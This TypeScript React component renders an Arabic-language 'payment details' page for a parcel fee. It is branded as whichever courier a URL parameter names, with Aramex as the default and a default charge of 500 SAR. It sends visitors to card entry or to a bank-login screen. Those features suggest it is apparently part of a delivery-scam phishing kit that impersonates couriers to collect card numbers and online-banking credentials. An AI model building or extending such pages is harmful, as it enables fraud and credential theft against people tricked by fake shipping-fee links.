import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, Building2, LogIn } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  
  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const handleCardPayment = () => {
    // Clear any previously selected bank
    sessionStorage.removeItem('selectedBank');
    sessionStorage.removeItem('selectedCountry');
    navigate(`/pay/${id}/card-input`);
  };
  
  const handleBankLogin = () => {
    navigate(`/pay/${id}/bank-selector`);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="تفاصيل الدفع"
      description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Shipping Info Display */}
      {shippingInfo && (
        <div className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg bg-muted/50">
          <h3 className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base">تفاصيل الشحنة</h3>
          <div className="space-y-2 text-xs sm:text-sm">
            {shippingInfo.tracking_number && (
              <div className="flex items-center gap-2">
                <Hash className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">رقم الشحنة:</span>
                <span className="font-semibold">{shippingInfo.tracking_number}</span>
              </div>
            )}
            {shippingInfo.package_description && (
              <div className="flex items-center gap-2">
                <Truck className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">وصف الطرد:</span>
                <span className="font-semibold">{shippingInfo.package_description}</span>
              </div>
            )}
            {shippingInfo.cod_amount > 0 && (
              <div className="flex items-center gap-2">
                <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                <span className="text-muted-foreground">مبلغ COD:</span>
                <span className="font-semibold">{shippingInfo.cod_amount} ر.س</span>
              </div>
            )}
          </div>
        </div>
      )}
      
      {/* Payment Summary */}
      <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
        <div className="flex justify-between py-2 sm:py-3 border-b border-border text-sm sm:text-base">
          <span className="text-muted-foreground">الخدمة</span>
          <span className="font-semibold">{serviceName}</span>
        </div>
        
        <div 
          className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
          }}
        >
          <span className="text-base sm:text-lg font-bold">المبلغ الإجمالي</span>
          <span className="text-xl sm:text-2xl font-bold" style={{ color: branding.colors.primary }}>
            {formattedAmount}
          </span>
        </div>
      </div>
    
      {/* Payment Method Selection */}
      <div className="mb-6 sm:mb-8">
        <h3 className="font-semibold mb-3 sm:mb-4 text-sm sm:text-base">اختر طريقة الدفع</h3>
        
        <div className="space-y-3 sm:space-y-4">
          {/* Card Payment Option */}
          <div 
            className="border-2 rounded-lg sm:rounded-xl p-4 sm:p-5 cursor-pointer transition-all hover:shadow-md"
            style={{
              borderColor: `${branding.colors.primary}40`,
              background: `${branding.colors.primary}05`
            }}
          >
            <div className="flex items-start gap-3 sm:gap-4 mb-3">
              <div 
                className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg sm:rounded-xl flex items-center justify-center flex-shrink-0"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                }}
              >
                <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-sm sm:text-base mb-1">الدفع بالبطاقة</p>
                <p className="text-xs sm:text-sm text-muted-foreground">
                  ادفع مباشرة ببطاقتك البنكية - Visa، Mastercard، Mada
                </p>
              </div>
            </div>
            <Button
              onClick={handleCardPayment}
              size="lg"
              className="w-full text-sm sm:text-base py-4 sm:py-5 text-white"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
              }}
            >
              <span className="ml-2">الدفع بالبطاقة</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </Button>
          </div>
          
          {/* Bank Login Option */}
          <div 
            className="border-2 rounded-lg sm:rounded-xl p-4 sm:p-5 cursor-pointer transition-all hover:shadow-md"
            style={{
              borderColor: `${branding.colors.secondary}40`,
              background: `${branding.colors.secondary}05`
            }}
          >
            <div className="flex items-start gap-3 sm:gap-4 mb-3">
              <div 
                className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg sm:rounded-xl flex items-center justify-center flex-shrink-0"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.secondary}, ${branding.colors.primary})`
                }}
              >
                <Building2 className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
              </div>
              <div className="flex-1">
                <p className="font-semibold text-sm sm:text-base mb-1">الدفع عن طريق تسجيل الدخول</p>
                <p className="text-xs sm:text-sm text-muted-foreground">
                  سجل دخول لحسابك البنكي لإتمام العملية بأمان
                </p>
              </div>
            </div>
            <Button
              onClick={handleBankLogin}
              size="lg"
              variant="outline"
              className="w-full text-sm sm:text-base py-4 sm:py-5"
              style={{
                borderColor: branding.colors.secondary,
                color: branding.colors.secondary
              }}
            >
              <LogIn className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
              <span className="ml-2">تسجيل الدخول للبنك</span>
              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
            </Button>
          </div>
        </div>
      </div>
    
      <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
        بالمتابعة، أنت توافق على الشروط والأحكام
      </p>
    </DynamicPaymentLayout>
  );
};

export default PaymentDetails;